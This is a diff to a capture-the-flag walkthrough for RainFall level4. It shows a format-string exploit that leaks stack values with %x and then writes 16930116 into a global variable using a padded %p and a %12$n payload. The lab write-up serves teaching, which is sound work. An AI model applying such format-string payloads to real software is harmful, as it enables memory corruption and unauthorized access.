@@ -40,8 +40,8 @@ This exercise is the same as the previous one, except that we have to write 1693
 
 So, First let's locate our input string on the stack and then determine the address of `m`:
 ```bash
-$ python -c 'print("AAAA" + "%x %x %x %x %x %x %x %x %x %x %x %x")' | ./level4
-AAAAb7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141
+level4@RainFall:~$ python -c 'print("AAAA %x %x %x %x %x %x %x %x %x %x %x %x")' | ./level4
+AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141
 ```
 
 In this output, 41414141, the hexadecimal representation of 'AAAA', is found at the twelfth position.
@@ -53,10 +53,10 @@ We can then craft our payload:
 address of m + padding + %n format specifier pointing to the twelfth argument
 
 "\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n"
-
-Since we need to write 16930116 into m, we write 16930116 characters (4 from the address of m and 16930112 from the width specifier of %p). 
-Then, we use the %n format specifier to record the count of bytes written so far into the twelfth argument, which is m's address.
 ```
+
+Since we need to write 16930116 into `m`, we write 16930116 characters (4 from the address of m and 16930112 from the width specifier of `%p`). 
+Then, we use the `%n` format specifier to write the count of bytes written so far into the twelfth argument, which corresponds to `m`'s address.
 
 Let's run our payload:
 ```bash
